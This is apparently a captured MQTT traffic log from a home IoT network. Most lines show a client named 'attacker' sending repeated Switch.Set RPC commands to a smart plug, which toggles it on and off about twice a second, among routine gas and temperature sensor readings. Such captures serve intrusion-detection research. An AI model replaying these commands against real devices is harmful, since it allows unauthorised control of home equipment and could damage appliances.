2026-04-22T16:39:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5346 34486.076 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:13,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:13,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34486.07,""swi"
2026-04-22T16:39:13,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5347 34486.094 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:13,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:13,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:13,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5348 34486.577 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:13,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:13,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34486.57,""swi"
2026-04-22T16:39:13,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5349 34486.593 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:14,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:14,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5350 34487.077 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:14,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:14,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34487.07,""swi"
2026-04-22T16:39:14,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5351 34487.095 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:14,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:14,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:14,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5352 34487.582 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:14,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:14,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34487.58,""swi"
2026-04-22T16:39:14,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5353 34487.598 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:15,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:15,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5354 34488.078 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:15,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:15,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34488.07,""swi"
2026-04-22T16:39:15,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5355 34488.096 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:15,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:15,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:15,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:15,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:15,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5356 34488.578 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:15,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:15,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34488.58,""swi"
2026-04-22T16:39:15,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5357 34488.595 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:16,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:16,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5358 34489.079 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:16,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:16,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34489.08,""swi"
2026-04-22T16:39:16,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5359 34489.097 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:16,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:16,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:16,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5360 34489.581 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:16,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.0, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:16,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34489.58,""swi"
2026-04-22T16:39:16,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5361 34489.598 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:16,iot/dht11/debug,59,[0;36m[D][dht:048]: Temperature 24.9°C Humidity 39.0%[0m
2026-04-22T16:39:16,iot/dht11/debug,53,[0;36m[D][sensor:124]: 'Temperature' >> 24.9 °C[0m
2026-04-22T16:39:16,iot/dht11/sensor/temperature/state,4,24.9
2026-04-22T16:39:16,iot/dht11/debug,46,[0;36m[D][sensor:124]: 'Humidity' >> 39 %[0m
2026-04-22T16:39:16,iot/dht11/sensor/humidity/state,2,39
2026-04-22T16:39:17,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:17,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5362 34490.080 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:17,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:17,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34490.08,""swi"
2026-04-22T16:39:17,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5363 34490.098 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:17,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:17,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:17,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5364 34490.580 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:17,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:17,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34490.58,""swi"
2026-04-22T16:39:17,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5365 34490.597 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:18,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:18,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5366 34491.083 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:18,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:18,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34491.08,""swi"
2026-04-22T16:39:18,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5367 34491.102 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:18,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:18,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:18,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5368 34491.582 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:18,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.4, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:18,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34491.58,""swi"
2026-04-22T16:39:18,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5369 34491.598 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:19,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:19,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5370 34492.083 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:19,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:19,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34492.08,""swi"
2026-04-22T16:39:19,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5371 34492.102 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:19,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:19,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:19,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5372 34492.583 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:19,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:19,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34492.58,""swi"
2026-04-22T16:39:19,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5373 34492.600 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:20,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:20,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5374 34493.085 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:20,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:20,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34493.08,""swi"
2026-04-22T16:39:20,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5375 34493.103 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:20,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:20,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:20,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:20,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:20,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5376 34493.587 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:20,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:20,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34493.58,""swi"
2026-04-22T16:39:20,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5377 34493.604 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:21,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:21,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5378 34494.086 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:21,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:21,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34494.08,""swi"
2026-04-22T16:39:21,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5379 34494.104 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:21,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:21,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:21,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5380 34494.585 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:21,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.1, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:21,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34494.58,""swi"
2026-04-22T16:39:21,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5381 34494.602 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:22,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:22,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5382 34495.089 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:22,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:22,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34495.09,""swi"
2026-04-22T16:39:22,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5383 34495.108 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:22,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:22,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:22,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5384 34495.589 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:22,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.2, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:22,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34495.59,""swi"
2026-04-22T16:39:22,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5385 34495.606 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:23,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:23,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5386 34496.088 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:23,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:23,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34496.08,""swi"
2026-04-22T16:39:23,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5387 34496.107 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:23,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:23,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:23,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5388 34496.588 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:23,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:23,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34496.59,""swi"
2026-04-22T16:39:23,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5389 34496.605 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:24,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:24,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5390 34497.089 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:24,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:24,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34497.09,""swi"
2026-04-22T16:39:24,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5391 34497.108 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:24,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:24,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:24,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5392 34497.589 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:24,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:24,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34497.59,""swi"
2026-04-22T16:39:24,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5393 34497.606 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:25,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:25,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
2026-04-22T16:39:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5394 34498.095 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:25,shellyazplug-node/status/switch:0,200,"{""id"":0, ""source"":""MQTT"", ""output"":false, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"
2026-04-22T16:39:25,shellyazplug-node/events/rpc,191,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34498.09,""swi"
2026-04-22T16:39:25,shellyazplug-node/debug/log,157,"shellyazplug-e4b323337220 5395 34498.114 1|shelly_notification:163 Status change of switch:0: {""id"":0,""apower"":0,""curren"
2026-04-22T16:39:25,iot/mq/debug,50,[0;36m[D][sensor:124]: 'Gas Sensor' >> 0.56 V[0m
2026-04-22T16:39:25,iot/mq/sensor/gas_sensor/state,4,0.56
2026-04-22T16:39:25,shellyazplug-node/rpc,85,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": true}}"
2026-04-22T16:39:25,attacker/rpc,85,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":false}}"
2026-04-22T16:39:25,shellyazplug-node/debug/log,88,"shellyazplug-e4b323337220 5396 34498.591 1|shos_rpc_inst.c:230     Switch.Set via MQTT 
"
2026-04-22T16:39:25,shellyazplug-node/status/switch:0,199,"{""id"":0, ""source"":""MQTT"", ""output"":true, ""apower"":0.0, ""voltage"":232.3, ""freq"":50.0, ""current"":0.000, ""aenergy"":{""total"""
2026-04-22T16:39:25,shellyazplug-node/events/rpc,167,"{""src"":""shellyazplug-e4b323337220"",""dst"":""shellyazplug-node/events"",""method"":""NotifyStatus"",""params"":{""ts"":34498.59,""swi"
2026-04-22T16:39:25,shellyazplug-node/debug/log,133,"shellyazplug-e4b323337220 5397 34498.607 1|shelly_notification:163 Status change of switch:0: {""id"":0,""output"":true,""sou"
2026-04-22T16:39:26,shellyazplug-node/rpc,86,"{""id"": 1, ""src"": ""attacker"", ""method"": ""Switch.Set"", ""params"": {""id"": 0, ""on"": false}}"
2026-04-22T16:39:26,attacker/rpc,84,"{""id"":1,""src"":""shellyazplug-e4b323337220"",""dst"":""attacker"",""result"":{""was_on"":true}}"
